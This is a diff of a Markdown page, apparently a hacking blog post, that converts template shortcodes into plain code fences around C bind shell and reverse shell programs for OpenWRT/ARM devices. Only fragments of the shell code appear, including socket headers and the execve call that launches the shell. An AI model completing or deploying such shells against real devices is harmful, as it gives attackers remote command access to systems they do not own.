@@ -30,9 +30,9 @@ root@ubuntu:~/asm$ arm-linux-gnueabi-gcc shell.c -g -o shell
 If you need some shells that may work in some OpenWRT Devices, then compile and hack away!
 
 <hr>
+
 ### Bind Shell
-{{% tabbed-codeblock bind %}}
-<!-- tab C-->
+```
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <netinet/in.h>
@@ -63,12 +63,10 @@ int main()
   execve(args[0], &args[0], 0);
   return 0;
 }
-<!-- endtab -->
-{{% /tabbed-codeblock %}}
+```
 
 ### Reverse Shell
-{{% tabbed-codeblock rev %}}
-<!-- tab C-->
+```
 #include <stdio.h>
 #include <unistd.h>
 #include <netinet/in.h>
@@ -94,5 +92,4 @@ int main(int argc, char *argv[])
   execve(args[0], &args[0], 0);
   return 0;
 }
-<!-- endtab -->
-{{% /tabbed-codeblock %}}
+```
